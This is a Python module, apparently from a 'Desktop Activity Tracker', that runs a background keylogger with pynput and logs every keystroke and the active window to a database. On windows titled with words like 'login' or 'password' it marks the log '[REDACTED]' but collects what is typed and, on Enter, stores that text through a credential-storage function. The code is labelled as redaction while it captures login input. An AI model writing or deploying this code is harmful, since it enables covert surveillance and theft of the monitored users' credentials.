"""
Keystroke tracking for Desktop Activity Tracker.
Logs keystrokes, detects sensitive input, and batches logs.
"""

import threading
import time
import queue
from typing import Optional
from pynput import keyboard
from storage.db import log_keystrokes_batch
from tracker.window_tracker import get_active_window
from storage.security import encrypt_and_store_credential
import logging

SENSITIVE_KEYWORDS = ["login", "sign in", "password", "auth"]
BATCH_SIZE = 20
FLUSH_INTERVAL = 1.0  # seconds

event_queue = queue.Queue()
keystroke_buffer = []
buffer_lock = threading.RLock()
typed_buffer = []
logger = logging.getLogger("keystroke_tracker")

def is_sensitive_window(title: Optional[str]) -> bool:
    """Return True if the window title suggests sensitive input."""
    if not title:
        return False
    return any(word in title.lower() for word in SENSITIVE_KEYWORDS)

def on_press(key) -> None:
    """Queue keystroke events for background processing."""
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    event_queue.put(k)

def _buffer_keystroke(k: str) -> None:
    """Buffer keystrokes and flush in batches."""
    with buffer_lock:
        keystroke_buffer.append(k)
        if len(keystroke_buffer) >= BATCH_SIZE:
            _flush_keystrokes()

def _flush_keystrokes() -> None:
    """Flush buffered keystrokes to the database."""
    global keystroke_buffer
    with buffer_lock:
        if keystroke_buffer:
            try:
                log_keystrokes_batch(keystroke_buffer)
                logger.info(f"Flushed {len(keystroke_buffer)} keystrokes to database.")
            except Exception as e:
                logger.error(f"Failed to flush keystrokes: {e}")
            keystroke_buffer.clear()

def _periodic_flush() -> None:
    """Periodically flush keystrokes regardless of buffer size."""
    while True:
        time.sleep(FLUSH_INTERVAL)
        _flush_keystrokes()

def _event_worker() -> None:
    """Process key events, handle sensitive detection, and window info."""
    global typed_buffer
    last_window = {'app': None, 'title': None}
    while True:
        k = event_queue.get()
        app, title = get_active_window()
        if app != last_window['app'] or title != last_window['title']:
            last_window['app'] = app
            last_window['title'] = title
            logger.debug(f"Active window changed: {app} - {title}")
        if is_sensitive_window(last_window['title']):
            _buffer_keystroke("[REDACTED]")
            typed_buffer.append(k)
            if any(trigger in k for trigger in ['\n', '\r', 'enter', 'return']):
                username = "".join(typed_buffer[:-1])
                try:
                    encrypt_and_store_credential(username, "REDACTED", last_window['app'], last_window['title'])
                    logger.info(f"Sensitive input detected and redacted for window: {last_window['title']}")
                except Exception as e:
                    logger.error(f"Failed to store credential: {e}")
                typed_buffer.clear()
        else:
            _buffer_keystroke(k)

def start_keystroke_logger() -> None:
    """Start background threads for keystroke logging and processing."""
    threading.Thread(target=_periodic_flush, daemon=True).start()
    threading.Thread(target=_event_worker, daemon=True).start()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    logger.info("Keystroke logger started.")
